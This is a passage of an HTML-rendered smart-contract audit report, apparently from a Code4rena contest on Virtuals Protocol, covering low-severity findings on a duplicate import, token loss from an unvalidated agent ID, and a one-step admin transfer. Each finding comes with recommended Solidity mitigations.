3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e[02] Duplicate import statement for \u003ccode\u003eMath.sol\u003c/code\u003e\u003c/h2\u003e\n\u003cp\u003eIn \u003ccode\u003eAgentInference.sol\u003c/code\u003e, the \u003ccode\u003e@openzeppelin/contracts/utils/math/Math.sol\u003c/code\u003e library is imported twice at the top of the file. This duplication is unnecessary and could lead to confusion for maintainers or reviewers. While it does not directly impact contract functionality or security, it is a code quality issue that can be easily avoided.\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/ba460bcbc56555f0c4f270c04e9c2375274059d1/contracts/AgentInference.sol#L6-L10\"\u003eAgentInference.sol#L6-L10\u003c/a\u003e\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"129\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;@openzeppelin/contracts/utils/math/Math.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Line 5\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// ... other imports\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;@openzeppelin/contracts/utils/math/Math.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Line 8 - duplicated import\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"recommended-mitigation-steps-32\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-32\" aria-label=\"recommended mitigation steps 32 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eRemove the redundant import statement so that \u003ccode\u003eMath.sol\u003c/code\u003e is imported only once at the top of the contract file.\u003c/p\u003e\n\u003ch2 id=\"03-invalid-agentid-leads-to-token-burning\" style=\"position:relative;\"\u003e\u003ca href=\"#03-invalid-agentid-leads-to-token-burning\" aria-label=\"03 invalid agentid leads to token burning permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e[03] Invalid \u003ccode\u003eagentId\u003c/code\u003e leads to token burning\u003c/h2\u003e\n\u003cp\u003eThe \u003ccode\u003eprompt\u003c/code\u003e and \u003ccode\u003epromptMulti\u003c/code\u003e functions in \u003ccode\u003eAgentInference.sol\u003c/code\u003e do not validate if an \u003ccode\u003eagentId\u003c/code\u003e exists in the \u003ccode\u003eagentNft\u003c/code\u003e contract before transferring tokens. If an invalid \u003ccode\u003eagentId\u003c/code\u003e is provided, \u003ccode\u003eagentNft.virtualInfo(agentId).tba\u003c/code\u003e will return \u003ccode\u003eaddress(0)\u003c/code\u003e (the zero address), causing tokens to be sent to this address. Sending tokens to the zero address effectively burns them, resulting in permanent loss of funds.\u003c/p\u003e\n\u003cp\u003eThis issue can occur through user error (e.g., providing an incorrect agent ID) or potentially through malicious inputs in a front-end interface. The impact is severe as users have no way to recover tokens sent to the zero address.\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/ba460bcbc56555f0c4f270c04e9c2375274059d1/contracts/AgentInference.sol#L52-L55\"\u003eAgentInference.sol#L52-L55\u003c/a\u003e\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"130\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// In prompt() function\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentIds\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentTba\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003evirtualInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etba\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esafeTransferFrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentTba\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/ba460bcbc56555f0c4f270c04e9c2375274059d1/contracts/AgentInference.sol#L82-L87\"\u003eAgentInference.sol#L82-L87\u003c/a\u003e\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"131\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// In promptMulti() function\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentIds\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eprevAgentId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e != \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentTba\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003evirtualInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etba\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esafeTransferFrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentTba\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"recommended-mitigation-steps-33\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-33\" aria-label=\"recommended mitigation steps 33 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eAdd validation checks to ensure the agent ID exists and the TBA address is not the zero address before transferring tokens:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"132\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// Inside both prompt() and promptMulti() functions\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentTba\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003evirtualInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etba\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentTba\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e != \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Invalid agentId\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esafeTransferFrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentTba\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis simple check will prevent tokens from being accidentally burned due to invalid agent IDs, protecting users from permanent loss of funds.\u003c/p\u003e\n\u003ch2 id=\"04-risky-one-step-admin-transfer-in-contributionnftsol\" style=\"position:relative;\"\u003e\u003ca href=\"#04-risky-one-step-admin-transfer-in-contributionnftsol\" aria-label=\"04 risky one step admin transfer in contributionnftsol permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e[04] Risky one-step admin transfer in \u003ccode\u003eContributionNft.sol\u003c/code\u003e\u003c/h2\u003e\n\u003cp\u003eThe \u003ccode\u003eContributionNft\u003c/code\u003e contract implements a one-step admin transfer pattern via the \u003ccode\u003esetAdmin\u003c/code\u003e function:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"133\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetAdmin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enewAdmin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_msgSender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() == \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_admin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Only admin can set admin\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_admin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enewAdmin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis approach is risky because it allows the current admin to immediately and irreversibly transfer admin rights to any address in a single transaction. If the admin address is mistyped, set to an address incapable of transaction signing, or set to the zero address, the contract’s admin privileges can be permanently lost. There is no confirmation or acceptance required from the new admin, increasing the risk of accidental or malicious loss of control.\u003c/p\u003e\n\u003ch3 id=\"impact-18\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-18\" aria-label=\"impact 18 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003ePermanent loss of admin privileges if the address is set incorrectly.\u003c/li\u003e\n\u003cli\u003eNo guarantee that the new admin can or will manage the contract.\u003c/li\u003e\n\u003cli\u003eNo way to recover admin rights if transferred to an invalid address.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/main/contracts/contribution/ContributionNft.sol#L103-L106\"\u003eContributionNft.sol#L103-L106\u003c/a\u003e\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"134\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetAdmin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enewAdmin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_msgSender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() == \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_admin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Only admin can set admin\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_admin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enewAdmin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"recommended-mitigation-steps-34\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-34\" aria-label=\"recommended mitigation steps 34 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eAdopt a two-step admin transfer process, similar to OpenZeppelin’s \u003ccode\u003eOwnable2Step\u003c/code\u003e pattern. This involves:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eThe current admin proposes a new admin address (\u003ccode\u003etransferAdmin\u003c/code\u003e).\u003c/li\u003e\n\u003cli\u003eThe new admin must explicitly accept the role in a separate transaction (\u003ccode\u003eacceptAdmin\u003c/code\u003e).\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eThis ensures that admin control is only transferred to an address that is able and willing to accept the role, and prevents accidental or malicious loss of admin privileges.\u003c/p\u003e\n\u003ch3 id=\"example-mitigation\" style=\"position:relative;\"\u003e\u003ca href=\"#example-mitigation\" aria-label=\"example mitigation permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eExample mitigation\u003c/h3\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"135\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eprivate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_pendingAdmin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransferAdmin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enewAdmin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_msgSender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() == \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_admin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, 